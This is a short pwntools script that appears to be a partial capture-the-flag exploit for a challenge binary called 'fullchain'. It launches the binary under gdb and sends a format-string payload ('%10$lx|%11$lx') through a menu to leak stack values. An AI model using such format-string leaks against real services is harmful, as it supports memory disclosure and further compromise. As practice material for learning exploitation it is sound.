from pwn import *

context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# Create Process
r = gdb.debug("./fullchain/share/fullchain",
              """
              aslr on
              b *chal+75
              b mywrite
              c
              """)
# r = remote("edu-ctf.zoolab.org", 30201)

def send_cmd2srv(obj: str, cmd: str, payload: bytes = b""):
    global r
    r.sendlineafter(b"global or local > ", obj.encode())
    r.sendlineafter(b"set, read or write > ", cmd.encode())
    
    if len(payload):
        r.sendline(payload)

# Increase Count Number
payload = b"%10$lx|%11$lx"
send_cmd2srv("global", "read", payload)
send_cmd2srv("global", "write")
send_cmd2srv("globa", "dd")

r.interactive()